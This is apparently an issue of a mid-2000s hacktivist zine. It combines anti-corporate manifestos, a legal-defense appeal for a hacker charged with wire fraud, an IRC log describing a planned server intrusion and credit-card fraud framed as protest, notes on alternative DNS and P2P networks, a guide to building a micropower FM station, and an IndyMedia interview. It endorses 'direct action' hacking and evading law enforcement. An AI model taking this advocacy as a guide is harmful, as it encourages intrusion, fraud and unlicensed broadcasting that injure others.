"Globalizing a bad thing makes it worse. Business power is bad, so globalizing
it is worse. But globalizing a good thing is usually good. Cooperation and
sharing of knowledge are good, and when they happen globally, they are even
better. The kind of globalization there are demonstrations against is the
globalization of business power. And free software is a part of that movement.
It is the expression of the opposition to domination of software users by
software developers."

"Whether through simple data piracy, or else by a more complex development of
actual rapport with chaos, the Web hacker, the cyernetican of the Temporary
Autonomous Zone, will find ways to take advantage of pertubations, crashes, and
breakdowns in the Net (ways to make information out of "entropy). As a scavanger
of information shards, smuggler, blackmailer, perhaps even cyberterrorist, the
TAZ-hacker will work for the evolution of clandestine fractal connections. These
connections, and the different information that flows among and between them,
will form "power outlets" for the coming-into-being of the TAZ itself-as if one
were to steal electricity from the energy-monopoly to light an abandoned house
for squatters." - Hakim Bey, Temporary Autonomous Zone
                             
[------------------------------------------------------------------------------]
[ hackers, crackers, artists & anarchists ........................... hackbloc ]
[------------------------------------------------------------------------------]

We started the Hack This Site project to spread the idea that information
demands to be free and by providing hackers with hands on training we could show
people how to use their skills for positive uses of free technology. After
meeting up with others who were working on similar projects and realizing how
people were inspired to turn skills to action from the first few zines we
released, we decided to get together and start Hackbloc.

Hackbloc are local gatherings of with hackers and activists to share skills, an
affinity group of hacktivists, and a tactic at protests and other actions. We
act to defend a free internet and a free society by mixing hacker and activist
strategies to explore both defensive hacktivism (defending free internet and
open publishing systems) and direct action hacktivism (actions against corrupt
corporations, governments and other forms of fascism). Hackbloc is a
decentralized network of cells which collaborate and coordinate actions in
solidarity with other social justice struggles around the world.

We met up at various actions and gatherings around the country to share and
network with other hackers and activists. We handed out underground hacker
magazines at guerrilla tables at DEFCON. We have had several workshops and
parties in Chicago where dozens of hackers around the region got together to
play wargames, pick locks, swap code, and otherwise plot for future projects and
actions. We got together to hold huge protests in both DC and San Francisco for
the World Bank / IMF meetings where several hundred thousand people gathered for
anti-war and anti-capitalists protests. The more we started coordinating our
actions with others who were working on similar projects, the more we began to
realize how different struggles all over the world are connected. 

Battles in the courtrooms over political and hacker arrests and investigations
of multiple people all over the world provide valuable lessons for those
considering getting involved, playing the game, and organizing online
communities. In order to be safe and effective, we need to practice good
security culture by working only with trusted people in tight decentralized
affinity groups, maintain a mainstream front to recruit people for side
projects, and work to settle differences between potential allies and unite for
the greater good. 

As people who can see beyond and create alternatives to corrupt systems, hackers
are in a unique position to confront and fight the forces which attack digital
rights and a free internet. Independent media, free technology and
non-commercial internet creates temporary autonomous zones where an underground
network of hackers who's duty and responsibility includes training each other to
confront and fight these injustices - to defend hackers facing jailtime, expose
corporate and government corruption, find alternatives to commercial software,
share knowledge and talk tactics with potential allies.

We are not the violent, destructive madmen that law enforcement and the media
paints us as. We work to build a free internet and a free world and we refuse to
be bullied by right wing extremists, white hat sellouts, or law enforcement who
stand in the way. Hacktivists of the world, unite!

"The FBI COINTELPRO program was initiated in 1956. Its purpose, as described
later by FBI Director J. Edgar Hoover, was "to expose, disrupt, misdirect,
discredit, or otherwise neutralize activities" of those individuals and
organizations whose ideas or goals he opposed. Tactics included: falsely
labelling individuals as informants; infiltrating groups with persons instructed
to disrupt the group; sending anonymous or forged letters designed to promote
strife between groups; initiating politically motivated IRS investigations;
carrying out burglaries of offices and unlawful wiretaps; and disseminating to
other government agencies and to the media unlawfully obtained derogatory
information on individuals and groups."

We are facing unprecedented police state measures which specifically target
activists and hackers. In the name of national security, federal law enforcement
has been spying on, targetting, and harassing activists including anti-war,
animal rights, and earth first and other protest groups. Whether they take on
the form of the USA Patriot Act, expanded Homeland Security powers, Total
Information Awareness, enemy combatants, military tribunals, or Bush personally
authorizing the NSA to spy on Americans without court orders and warrants, these
actions reveal a pattern of abuse and the transition to a neo-fascist police
state which treats hackers and activists as terrorists. When an administration
breaks the law and walks all over the constitution, it is time for a regime
change.

[ support hairball against unjust felony charges ...... hacker defense network ]
[------------------------------------------------------------------------------]

Federal prosecuters are accusing Michael Wally(known as "Hairball") of
Pittsburgh of 'stealing' and distributing 37,000 free phone cards from an online
giveaway, citing damages at over $333,000. As of this writing, the US Attorney
is offering Hairball a deal where he would plead guilty to felony wire fraud and
serve up to three years in jail. 

Folgers.com was giving away free 30 minute phone cards on it's website as part
of an online promotion to people who filled out a quick survey. Allegedly,
Hairball found a way to automate the process and get lists of free phone cards.
What is unclear about these accusations is whether this is an actual criminal
offense or simply a violation of Folger's terms of service agreement(a civil
case). 

Hairball, having started HBX Networks, was a popular target of cyber-crime
authorities. HBX has started a number of computer hacking projects, including
the free shell project, the HAXOR radio show, wardialing projects, a bustling
IRC server, and more. Hairball has contributed positively to the hacking
community, but has fallen victim to unjust prosecution with overblown
sentencing.

As part of a new trend in cyber crime and law enforcement, hackers and activists
are treated like terrorists and are often subject to illegal surveillance and
unjust investigation, prosecution, and sentencing. Robert Erdley of the
Pittsburgh High Tech Crimes Task Force has personally raided and arrested
Hairball multiple times, including an earlier incident in late August 2004
relating to HBX's wardialing project. His case has since been passed on to
federal authorities, and is now facing several years in jail and large
restitutions for hurting or stealing from nobody.

Hairball has always worked to defend free technology and has inspired a number
of people to learn about computers and hacking. If Hairball goes to jail, a
great crime will have been committed against the hacking community by
reactionary federal prosecutors. We need to stick together to defend our
comrades facing jailtime and write letters, make phone calls, and otherwise
spread the word about unjust hacker prosecution.

THEY'RE IN THERE FOR US, WE'RE OUT HERE FOR THEM

Hackers considering starting a Hacker Defense Network should check out various
prison support networks for setting up legal support.

[07:24:40 PM] Kfir: hello there.
[07:25:09 PM] narc: hi. I'm not liable for prosecution, or
              anything, based on the logs I sent you?
[07:25:32 PM] narc: that concerns me.. I'm willing to help you in
              every capacity possible, but that's one thing I'd rather
              avoid
[07:26:00 PM] Kfir: I'm not sure... but i can't imagine anyone would
              prosecute someone who is walking away, and helping catch
              the mastermind
[07:26:13 PM] narc: well. I never actually intruded on your
              system
[07:26:19 PM] narc: all I did was notice an exploit in the .php
[07:26:19 PM] narc: heg
[07:26:21 PM] narc: heh*
[07:26:41 PM] Kfir: I tell you what though, i would fight tooth and
              nail to prevent your prosecution.
[07:26:55 PM] narc: I don't *think* that's a criminal offence
[07:27:15 PM] Kfir: i would rather not prosecute anyone if you're
              going to go down - you are helping us tremendously, and
              you are preventing some very serious criminal activity.
[07:27:47 PM] Kfir: i am in the process of trying to get all of the
              credit card numbers fraud blocked.
[07:27:55 PM] Kfir: it's not easy work, but i need some time.
[07:27:58 PM] narc: yeah
[07:28:01 PM] narc: I can imagine
[07:28:04 PM] Kfir: is there any way you can postpone the charges for
              a couple of days?
[07:28:08 PM] narc: yes
[07:28:13 PM] narc: he's stymied at the moment
[07:28:19 PM] narc: he's putting it off til at least sunday
[07:28:23 PM] narc: maybe later in the week
[07:28:28 PM] Kfir: good.
[07:28:50 PM] Kfir: i'm going to need that much time to make sure no
              one gets defrauded.  i don't give a damn about the
              server at this point.
[07:29:10 PM] narc: yeah... he already had SQL dumps by the time
              he contacted me
[07:29:16 PM] Kfir: he can have the goddamned thing.  it's not like
              we're going to pack our bags and dissappear.
[07:29:17 PM] narc: so I don't quite know how he obtained them
[07:29:34 PM] narc: yeah, well, from what I gathered from running
              processes he pasted, you were backing the box up anyway
[07:29:35 PM] narc: heh
[07:30:15 PM] Kfir: If i'm going to get the fbi to listen to me, a
              credible witness would be a long way.  If you are
              gauranteed from prosecution, would you cooperate with
              authorities?
[07:30:40 PM] narc: yeah
[07:30:43 PM] Kfir: yeah, i have the entire server tar balled and
              safely stored for future use.
[07:30:58 PM] narc: but this may cause problems insofar as I'd
              rather not have him know who I am
[07:31:06 PM] Kfir: does he?
[07:31:09 PM] narc: no
[07:31:10 PM] narc: he probably has a LOT of sway with certain
              people
[07:31:55 PM] narc: he's made a lot of contacts in the scene...
              knows many, many security experts, and probably knows
              plenty of militant activists too
[07:31:56 PM] Kfir: Jeremy can get into very big trouble - he's just a
              kid, and i would hate to see a man with obvious talent
              be sent to prison.
[07:32:30 PM] narc: yeah... I'm only 18
[07:32:31 PM] Kfir: but this credit card business is just crazy - i
              really don't understand what would drive someone to do
              something so foolish.
[07:32:49 PM] Kfir: wow...
[07:33:09 PM] Kfir: kids today... i need to bone up on my security
              knowledge. 
[07:33:47 PM] narc: if there's one thing he is, it's willing to
              goto prison
[07:34:09 PM] narc: his beliefs consume everything he does
[07:34:23 PM] narc: not fundamentally that different from your
              average Islamic terrorist, I guess.
[07:34:33 PM] Kfir: i started coding HQ and administering the PW
              server without much experience.  after reading the logs
              i can see how much there is to learn - it almost seems
              like it would take a full-time concentration to master.
[07:35:20 PM] Kfir: so why did you agree in the first place?  you
              obviously have moral fiber... why destroy other peoples
              property?
[07:35:29 PM] narc: I never planned to
[07:35:38 PM] narc: I was going to see where it was heading
[07:35:47 PM] narc: showing him an exploit seemed like a good way
              to gain his trust
[07:36:12 PM] Kfir: oh..
[07:36:25 PM] Kfir: so does he not have root access at this point?
[07:36:32 PM] narc: nope
[07:36:44 PM] Kfir: is he waiting for the bots to restart?
[07:36:47 PM] narc: I've had the distinct impression in the year
              and a half that I have known the guy that he has been up
              to a lot more than it seems
[07:36:49 PM] narc: turns out I was right
[07:37:48 PM] narc: besides, the exploit I gave him never quite
              worked
[07:38:28 PM] narc: I knew it'd work on the test copy of the bot
              he'd setup, but not on your box -- diff ver of php
              command line binary
[07:38:53 PM] Kfir: so is he waiting for the bots to fire up?
[07:39:08 PM] narc: I believe so
[07:39:28 PM] narc: but believe me, that flaw was very, very
              minor... even exploiting is well past most people's
              capabilities, as the vast majority of shell
              metacharacters were prohibited
[07:39:40 PM] Kfir: do you have any details as to his plans to use the
              pw server to launch the cc charge exploit?
[07:39:41 PM] narc: you ran a pretty good system
[07:39:49 PM] narc: from what I've seen
[07:39:59 PM] Kfir: that's rob's work... i mainly work on the php
              code.
[07:40:04 PM] narc: yeah
[07:40:10 PM] narc: well, your PHP code had few flaws
[07:40:12 PM] narc: if any...
[07:40:15 PM] narc: Xec never found any
[07:40:33 PM] Kfir: yeah, we were very careful in our patch up after
              the RNC hack
[07:40:59 PM] Kfir: we made sure no malicious chars were allowed to
              enter an sql query.
[07:41:13 PM] narc: his own site had a few billion holes
[07:41:24 PM] Kfir: hts.org?
[07:41:36 PM] narc: yeah
[07:41:51 PM] narc: I got involved with them to learn, not to take
              down the opposition's political speech
[07:41:57 PM] Kfir: i trained on his site about a year ago.
[07:42:11 PM] Kfir: agreed - let the best ideas win.
[07:42:37 PM] Kfir: not the best gun.
[07:42:47 PM] narc: I don't think he realizes that he has become
              precisely what he purports to despise so much
[07:43:11 PM] Kfir: no offense to you, but that seems to be very
              typical of those we encounter on the "other side".
[07:43:32 PM] Kfir: you seem extremely mature for an 18-year-old, it's
              almost hard to believe.
[07:43:42 PM] Kfir: But you Aussies always were a breed apart.
[07:44:10 PM] narc: heh... I just started college, I don't have
              much interest in going down for some stupid hacking
              offence
[07:44:42 PM] Kfir: i think he's intoxicated by the glory of being an
              "underground hacker".
[07:44:59 PM] Kfir: he's in love with this romantic notion of taking
              down the "fascists".
[07:45:02 PM] Kfir: very deluded.
[07:45:02 PM] narc: no glory in destruction, or so I've found
[07:45:38 PM] Kfir: do you have any details as to his plans to use the
              pw server to launch the cc charge exploit?
[07:45:51 PM] Kfir: i noticed he mentioned that in the logs.
[07:46:12 PM] narc: yes, he wanted me to write scripts to do it
[07:46:14 PM] narc: still does, I guess
[07:46:30 PM] narc: but that's been delayed by the fact the
              exploits have mysteriously disappeared
[07:46:40 PM] Kfir: so will you postpone that as much as you can
              without him knowing your postponing?
[07:46:57 PM] Kfir: assuming he finds another exploit?
[07:47:04 PM] narc: he won't know. he's paranoid; believes that
              the feds are probably already watching him
[07:47:14 PM] narc: probably are, too, given his history
[07:47:19 PM] narc: they've tried to pin a lot of stuff on him but
              failed
[07:47:25 PM] Kfir: has he broadcasted the cc#'s yet?
[07:47:34 PM] narc: no. that waits until the charges occur
[07:47:41 PM] narc: then he plans to release them to cryptome.org
              and P2P networks
[07:47:49 PM] narc: as well as using his media contacts to ensure
              wide publicity
[07:47:54 PM] Kfir: well, at that point, they'll be useless.
[07:47:59 PM] narc: yeah
[07:48:06 PM] narc: but I think the point is a "moral victory"
[07:48:08 PM] narc: or so he says
[07:48:09 PM] Kfir: how does he plan to get publicity while remaining
              anonymous?
[07:48:24 PM] narc: anonymous remailers/his bounce servers, I
              guess.
[07:48:36 PM] Kfir: will an official organization take credit?
[07:48:38 PM] narc: unless he's caught in the act, it'll take
              months of subpoenas to prove it was him
[07:48:43 PM] narc: yeah
[07:48:44 PM] narc: ILF
[07:48:48 PM] narc: ("Internet Liberation Front")
[07:48:51 PM] Kfir: why months of subpoenas?
[07:48:57 PM] narc: international servers...
[07:49:00 PM] narc: most aren't domestic
[07:49:16 PM] narc: and he plans to get someone else to wipe the
              lot to break the chain
[07:49:29 PM] narc: he might not be that talented at hacking per
              se, but he knows how to cover his tracks
[07:49:30 PM] Kfir: well, the logs are fairly incriminating.
[07:50:00 PM] narc: I'm almost certain he'd get away with it if I
              hadn't contacted you
[07:50:10 PM] Kfir: no argument there.

[ fighting the commercialization of the internet ............................. ]
[------------------------------------------------------------------------------]

As hard as corporations and governments try to control the flow of data on the
internet, they can never catch up with hackers who are always one step ahead and
have developed all sorts of ways to circumvent restrictions placed on exchanging
information freely. An ever-growing number of darknets and other models of
content distribution have been created using file sharing services such as
Gnutella and BitTorrent, open publishing systems such as IndyMedia and Wiki, and
open DNS systems such as OpenNIC and Afraid.org. These DIY networks cannot be
bought, sold, or otherwise controlled and are unstoppable weapons which will not
only make copyright and commercial internet irrelevant, but pave the way to
developing entirely new networks, pirate utopias based on an open source
anarchist approach towards the free exchange of information.

"Quantity and quality of P2P technologies are inversely proportional  
to the numbers of lawsuits issued to stop P2P" - 3rd Monty's Law

--
Gross privacy violations are a small part of fundamental problems with how ICANN
is structured. In a paper published at kuro5hin.org, "An Immodest DNS Proposal"
outlines the broader problems with ICANN's DNS model:

* DNS is centrally controlled by an organization (ICANN) whose primary interest
is supporting business, rather than in maintaining and improving the system
itself and whose primary claim to legitimacy is through delegation by a single
country's government (USA).

* The system is managed by a single for-profit corporation (NSI), which is bad
enough but registrations are managed by many competing for-profit corporations.
NSI is also primarily legitimized by delegation from a single government (USA
again, naturally).

* The Intellectual Property laws of a single country (there's the USA again) are
being used inappropriately to control the activities of users in non-commercial
parts of the Net (corporate control of the .net and .org domain trees through US
Trademark law) and in other countries.
--

Open publishing systems such as the IndyMedia allows people to post
announcements freely and become the media. IndyMedia is a decentralized network
of media collectives found in most major cities around the world that allow
people to post announcements, update fliers, and otherwise tune in to the
happenings of the area. There are several flavors of IMC software including
sfactive, mir, and dadaimc - all of which have advantages and disadvantages.
IndyMedia software is generally open source and people can and do set up their
own IMC collectives with minimal effort. Wiki open publishing software has
becoming increasingly popular over the past few years. Sites with Wiki allow
people to create and modify all pages in the index, and instead of resulting
with chaos and confusion, services like Wikipedia.org have become wildly
successful.

Peer to peer file sharing services open whole new worlds where we can
communicate and collaborate at an accelerated rate, where creativity isn't
inhibited by such artificialities as copyright laws and property rights. Moving
well beyond centralized systems such as Napster, technology like BitTorrent,
Gnutella, FastTrack, eDonkey, and countless others have created networks
independent of centralized servers allowing people to share files and write
their own clients for these protocols. Our success with these services are
indicated by how frightened the commercial industry is getting and how desperate
and ineffectual their attempts to shut down these services through legal means.
When one service shuts down, another three spring up even more decentralized and
anonymous than before.

In addition to providing free dynamic DNS services, Afraid.org has also set up a
system where domains can be made public and shared with other users on the
internet. People can register domains, point them to afraid.org's DNS servers,
and make them 'public' - allowing others to register their own subdomains and
have them point to their own servers. There are thousands of public domains that
people can already start using.

--

ICANN and Alternatives to Commercial DNS
Since ICANN policy is now requiring valid public contact information, many
domain names which host controversial content including dissident or
whistleblowing services have had to choose to give up their name, email, phone
number, and address or face being shut down. Several domains we run including
Hack This Site, Hacktivist.net, FreeJeremy.com and Prole.info were all targetted
and shut down without any warning, taking weeks for them to respond to us faxing
in copies of our drivers license, phone bills, and other documentation
confirming our true information. This new policy is an obscene violation of our
privacy and is a threat to dissident or whistleblowing groups.

In the resulting discussions, the OpenNIC project was created to be a "user
owned and controlled Network Information Center offering a democratic,
non-national, alternative to the traditional Top-Level Domain registries". Users
can jump on this network by adding an OpenNIC DNS server to their system
configuration.

OpenNIC is non-profit and structured in a democratic way, with elected
administrators and public ballots for new policies, also giving the ability for
people to start their own top level domains (such as .indy, .geek, .null, .oss,
and .parody) The idea is to be non-profit, democratic, and allow people to
create and manage their own top level domains.

As long as we are communicating through commercial ISPs, we subject ourselves to
networks which can be easily monitored and controlled. Even though we can
develop all sorts of ways of sliding in and out of these systems securely, we
are still reliant on internet infrastructure that is owned and run by
corporations and government. We need to be come used to the idea of 

The Guerrilla.Net project proposes setting up an alternative network of open
wifi nodes. Encryption and anonyminity is integrated at a router level, also
creating the ability to establish secure tunnels to the 'real' internet. The
idea is to set up a decentralized network of wifi cells run by entirely
non-profit groups using open standards.

--
"There is evidence that the darknet will continue to exist and provide low cost,
high-quality service to a large group of consumers. This means that in many
markets, the darknet will be a competitor to legal commerce. From the point of
view of economic theory, this has profound implications for business strategy:
for example, increased security may act as a disincentive to legal commerce."
--
"As pressure is asserted upon the Internet from insecure individuals in various
World Governments, an alternative network is needed to insure that the free flow
of information is not obstructed, captured, analyzed, modified, or logged. This
is the main purpose of guerrilla.net. To provide a networking fabric outside of
Governments, commercial Internet service providers, telecommunications
companies, and dubius Internet regulatory bodies. The free flow of private
information is a REQUIREMENT of a free society."
(guerrilla.net)
--
To help with the OpenNIC project, set up your computer(and convince your ISP) to
use the additional OpenNIC DNS servers and sign up on the mailing list to keep
up and contribute to the project. Some people have also suggested the idea of
having "OpenDNS Day", where for one day out of the month people would have their
servers configured to disallow connections from ICANN requests, encouraging
people to set up OpenNIC on their machines.

OpenNIC DNS servers are split into three tiers: the first two tiers are for
internal synchronization purposes while the third tier are end-user servers
which you can add to your network settings to hop on the entwork.

Tier 0:
ns0.opennic.glue (opennic.glue; Oakland, CA, US) - 131.161.247.232

[ hacktivism project introduction ............................................ ]
[------------------------------------------------------------------------------]

As hacktivists, we encourage hackers to consider the social and political
implications of actions. We believe it is irresponsible to teach people the
fundamentals of internet security without a broad understanding of the world
around them. We are in a unique position to work together to defend our rights
on the internet and in social justice struggles around the world. 

We maintain a diversity of tactics through the following collectives which work
together to build a broader movement:

Hacktivist.net - We serve as an above ground ‘think tank' for the ideals of
hacktivism and electronic civil disobedience. We defend open publishing systems
and encourage free debate about the ethics of mixing hacking and radical
politics. 

Hackbloc.org - A model of organizing hacktivist cells in each local city. Each
cell maintains autonomy from central leadership yet coordinates and networks
with other hackbloc cells all over the world. The Hackbloc website serves as a
networking body where people can read updates and plug in to local collectives.

HackThisSite.org - An above ground training resource where everybody can
practice their hacking skills in a set of realistic challenges. We create a
learning environment where people can find out and get involved with many of the
other projects our people are working on. 

Various projects and groups we are involved with:

* Publish an open hacktivist journal to be distributed for free over the
internet and in print
* Liberation Radio: creation and distribution of subversive audio recordings and
other underground materials through an online radio station
* Protect free speech on the internet by making contributions and code audits to
major IndyMedia, Wiki, IRC, P2P file sharing, and other open publishing code
bases
* Provide hosting and support for radical systems in cases of hack attacks,s
erver seizures, etc.
* Participate in various conventions, protests, and other national actions to
provide on-the-ground communication while making noise and spreading the word
about hacktivism
  
We use a decentralized, directly democratic model of organization and are
looking for contributions and coordination from people who would like to become
involved with the project. We are interested in working together with other
groups and individuals to build a larger hacker movement. Together we stand,
divided we fall.

Hacktivists of the world, unite!

FM EXCITERS And AMPLIFIERS
This is the “heart” of your station. It has an oscillator, an audio input
section, a FM modulation section, a RF pre-amplification stage and an RF
amplified output stage and sometimes an RF filter stage. 

ANTENNAS 
An properly tuned (low VSWR) antenna, J-pole, 5/8ths wave vertical, 1/4 wave
dipole, broadband etc. as high up as you can get it makes up for LOTS of power
and is money and time WELL spent! 

AMPLIFIERS 
Amplifiers are pretty boring pieces of equipment. They amplify your measly
little exciter’s signals to levels that will deliver solid reception to your
listening audience. 

FILTERS 
These devices are used to decrease the output of frequencies with which you are
NOT broadcasting. These OTHER frequencies are known as harmonics and you don’t
want any! Harmonics are your enemy! 

SWR METERS 
You get what you pay for when you buy a VSWR meter. Cheap ones are worthless,
they’ll lie and make you confident when you should be otherwise. Bird makes the
BEST and they are expensive at $300+ US, however, Diawa, Diamond, Standard
Communications are all good, servicable units that you can trust and will last
and last. 

DUMMY LOADS 
You’ll have a perfect VSWR reading every time with a dummy load! No signal out
but what the hey! Easy to build a little one, pre-built ones can cost $30 - $100
or so depending on the wattage it must handle.     

Tuning your antenna 
Using a properly tuned antenna is essential for micropower broadcasting on the
FM band. An antenna that is not properly tuned will not pass along your
transmitter’s power as efficiently as it could and this leads to a general
degradation of signal coverage. 

ETHICS: 
The airwaves are a community property. One must always treat it 
as such, respecting the space of other stations, both commercial 
and micro. 

LOOKING FOR OPENINGS: 
Admittedly, some parts of the country have no empty channels. Places like south
Florida, California, New York and Chicago are virtually crammed full of
stations. For the rest of us, if we look hard, we can locate one or more unused
channels. 

ONCE YOU DECIDE 
You’ve located a channel that’s clear and has no strong nearby adjacents
broadcasting. 
1. Educate yourself about radio theory. Buy the Radio Amateur’s Handbook and
study it. 
2. You’ll need some essential tools to avoid working blind. You should have an
oscilloscope with at least a 100Mhz bandwidth so you can see what your carrier
looks like and if the device is operating incorrectly, causing parasitic
oscillation. You should have a good stable frequency counter that has at least a
10 ppm accuracy and resolution to 1hz at 100Mhz. A good Volt-Ohmmeter for
general measurements of voltages and resistance. 

A SWR impedance analyzer bridge (MFJ Enterprises makes an affordable unit, model
MFJ259, which combines a frequency counter, R.F. signal generator, SWR meter and
resistance meter in one versatile unit). 

ESSENTIAL COMPONENTS OF A STATION 
The main transmitter. A unit that is crystal-controlled and/or PLL synthesized,
using varactor diode tuning and modulation methods. A broadcast limiter. Stereo,
if you have a stereo generator. This is essential to insure non-interference to
adjacent channels and maintain maximum volume without overmodulating. Setting
your modulation levels.

  * An SWR/Power Meter to monitor the condition of your antenna system. 
  * A mixing board to act as your program control center. 
  * Audio sources to provide program material. 
  * A good microphone. 

Optionally, if you broadcast in stereo, you’ll need to add the fol- 
lowing: 

  * A multiplex “stereo” generator.  
  * Two-channel broadcast limiter. 

All components back to the studio should be stereo capable.

[ declaration of the independence of cyberspace ....... john barlow of the EFF ]
[------------------------------------------------------------------------------]

Governments of the Industrial World, you weary giants of flesh and steel, I come
from Cyberspace, the new home of Mind. On behalf of the future, I ask you of the
past to leave us alone. You are not welcome among us. You have no sovereignty
where we gather.

We have no elected government, nor are we likely to have one, so I address you
with no greater authority than that with which liberty itself always speaks. I
declare the global social space we are building to be naturally independent of
the tyrannies you seek to impose on us. You have no moral right to rule us nor
do you possess any methods of enforcement we have true reason to fear.

Governments derive their just powers from the consent of the governed. You have
neither solicited nor received ours. We did not invite you. You do not know us,
nor do you know our world. Cyberspace does not lie within your borders. Do not
think that you can build it, as though it were a public construction project.
You cannot. It is an act of nature and it grows itself through our collective
actions.

You have not engaged in our great and gathering conversation, nor did you create
the wealth of our marketplaces. You do not know our culture, our ethics, or the
unwritten codes that already provide our society more order than could be
obtained by any of your impositions.

You claim there are problems among us that you need to solve. You use this claim
as an excuse to invade our precincts. Many of these problems don't exist. Where
there are real conflicts, where there are wrongs, we will identify them and
address them by our means. We are forming our own Social Contract. This
governance will arise according to the conditions of our world, not yours. Our
world is different.

Cyberspace consists of transactions, relationships, and thought itself, arrayed
like a standing wave in the web of our communications. Ours is a world that is
both everywhere and nowhere, but it is not where bodies live.

We are creating a world that all may enter without privilege or prejudice
accorded by race, economic power, military force, or station of birth.

We are creating a world where anyone, anywhere may express his or her beliefs,
no matter how singular, without fear of being coerced into silence or
conformity.

Your legal concepts of property, expression, identity, movement, and context do
not apply to us. They are based on matter, There is no matter here.

Our identities have no bodies, so, unlike you, we cannot obtain order by
physical coercion. We believe that from ethics, enlightened self-interest, and
the commonweal, our governance will emerge. Our identities may be distributed
across many of your jurisdictions. The only law that all our constituent
cultures would generally recognize is the Golden Rule. We hope we will be able
to build our particular solutions on that basis. But we cannot accept the
solutions you are attempting to impose.

In the United States, you have today created a law, the Telecommunications
Reform Act, which repudiates your own Constitution and insults the dreams of
Jefferson, Washington, Mill, Madison, DeToqueville, and Brandeis. These dreams
must now be born anew in us.

You are terrified of your own children, since they are natives in a world where
you will always be immigrants. Because you fear them, you entrust your
bureaucracies with the parental responsibilities you are too cowardly to
confront yourselves. In our world, all the sentiments and expressions of
humanity, from the debasing to the angelic, are parts of a seamless whole, the
global conversation of bits. We cannot separate the air that chokes from the air
upon which wings beat.

In China, Germany, France, Russia, Singapore, Italy and the United States, you
are trying to ward off the virus of liberty by erecting guard posts at the
frontiers of Cyberspace. These may keep out the contagion for a small time, but
they will not work in a world that will soon be blanketed in bit-bearing media.

Your increasingly obsolete information industries would perpetuate themselves by
proposing laws, in America and elsewhere, that claim to own speech itself
throughout the world. These laws would declare ideas to be another industrial
product, no more noble than pig iron. In our world, whatever the human mind may
create can be reproduced and distributed infinitely at no cost. The global
conveyance of thought no longer requires your factories to accomplish.

These increasingly hostile and colonial measures place us in the same position
as those previous lovers of freedom and self-determination who had to reject the
authorities of distant, uninformed powers. We must declare our virtual selves
immune to your sovereignty, even as we continue to consent to your rule over our
bodies. We will spread ourselves across the Planet so that no one can arrest our
thoughts.

We will create a civilization of the Mind in Cyberspace. May it be more humane
and fair than the world your governments have made before.

[ uk indymedia interview: hackers defending open publishing systems .......... ]
[------------------------------------------------------------------------------]

Activists from HackThisSite.org at down with one of the UK IndyMedia system
administrators at the recent DEFCON hacker convention. We interviewed him
regarding the server seizures, how hackers can work to protect open publishing
systems such as IndyMedia, and how hackers are becoming more radicalized and
involved with social justice struggles. This interview is being streamed as part
of the new website http://www.Hacktivist.net. 

Listen to the interview via MP3: http://www.hacktivist.net/radio/ukindymedia.mp3

Jeremy: This is Jeremy from HackThisSite.org and I'm sitting in the room with
several people who are loosely affiliated with our website as well as someone
who is on the UK IndyMedia project. We have a few things we'd like to talk about
like how to protect open publishing systems such as IndyMedia, how to configure
our servers in such a way that makes us less liable, and how hackers can play a
more integral role in defending open publishing systems. Other people are going
to introduce themselves right now:

UK: Hello this is ..... from the UK and I'm from UK IndyMedia

Alx: This is Alxciada from HTS

Gary: This is Gary Naham, an activist in Chicago hoping to becoming a hacktivist
dedicated to seeing government systems that survive and respect the digital
evolution of technology and not interfere

Jeremy: We have a few things we'd like to talk about specifically about how
hackers can play a more integral role and help work with various media
collectives, but we'd also like afterwards talk in general about IndyMedia, free
speech, open publishing systems, p2p file sharing systems, and how hackers can
work together with people to help pressure and change the law. For starters, why
don't you tell us a little bit about yourself, what sort of work you do, what
groups you work with in the past, how you help out?

UK: A little about myself, well, by day an IT techie, by night an IT director I
run public internet, public internet is one of the hosting points indymedia uk,
the wiki server, and I kinda got involved when the server seizure happened about
9-12 months ago, kinda became quite important to me that we brought em up as
quickly as possible because the time we're down, we lose the chance to tell our
side of the story so I put up one of our servers put a mirror off the publishing
site and we went from there.

Jeremy: Great. So right now you're currently working as IT director to help out
with configuring and setting up these servers when they go down?

UK: Yeah that's right, let me quickly go over all the things I'm involved with.
Primarily I run a server mirroring the UK site. Additionally I set up rackspace
for some of the other indymedia projects that are currently going on. Current in
the process of trying to security data with what's going on in the world.

Jeremy: I understand that it is very vague about what the feds had been looking
for on these servers and there's some degree of confusion. Can you tell us any
details about what sort of data or evidence they were looking for and how they
executed the search?

UK: From my understanding it wasn't actually the feds who were after the server.
My understanding is that it was a result of pressure by the Swiss and Italian
government relating to previous protests in Genoa and Niece, I believe those
were the two areas of interests. I believe photos were published which ...
authorities didn't like, and yeah, they were looking for server logs, they were
looking for IPs, now fortunately, our server doesn't log IPs!

[Great! What a shame! Too bad!]

Jeremy: I heard the pictures that were posted were undercover police and they
were looking for the people who originally published them?

UK: That's the Swiss connection I believe, however I think the Italian
government had a more general problem with IndyMedia - I met with the house I
wonder if that's what that connection came from.

Jeremy: How could the Italian authorities pressure the British government to
execute this raid?

UK: As I understand it, there's a mutual legal assistance treaty with Italy and
the US. Now Rackspace which previously hosted the UK server is a US company
which therefore falls under US jurisdiction to a degree. Question not entirely
legal because the servers were hosted in the UK and rackspace has a legal entity
in the UK, therefore, we believe it should have gone through due process in the
UK who should have taken the servers - they didn't, that's what the line is at
the moment.

Jeremy: The hosting company itself gave the server up upon request by western
authorities?

UK: I believe so, now this is one of the interesting things, and this ties back
with where we are today. Apparently, the servers weren't actually requested, the
logs were requested, and Rackspace went one step further. Rackspace effectively
bent over and took it. They handed over the entire server system.

Jeremy: Wow.

Alxciada: So they were originally coming for the logs.

UK: Apparently so, that's what we're hearing, hopefully in the next few days we
should hear a little more about it. The EFF put enough pressure on the US side
to get the papers.

Alxciada: Was it United States federal agents that raided the server?

UK: I believe so. I believe it was Rackspace employees that went in took the
servers. The court orders that were filed were filed in Texas. The EFF basically
went through that and demanded the papers, and that's currently being sorted
out, but hopefully we'll get a clear picture of what they were after.

Gary: Are there any areas of European or British security law that provides
coverage or at least an option of defending against this?

UK: Oh, yes! Data protection acts alone should cover this kind of issue because
they effectively seized a server that hosted shitloads of different stuff. They
were after one very specific piece of information and in the process gathering
lots of other shit so I imagine there are data protection acts that have bearing
on the case.

Gary: Are there legal remedies available to prosecute and affect authorities if
this is an extrajudicial action which is what it sounds like. 

UK: I'm not sure if anything is happening in the UK because unfortunately the UK
Europedoesn't have anything an EFF at this stage. It's one of the things that's
being worked on talked about but it's never achieved fruition. Therefore we're
depending on a far wider group of individuals to help us out. Looking at people
associated with journalism, trade, privacy, etc. but there's no central group
for information privacy having to do with electronic

Gary: So European Data Security laws are even less protective than US security?

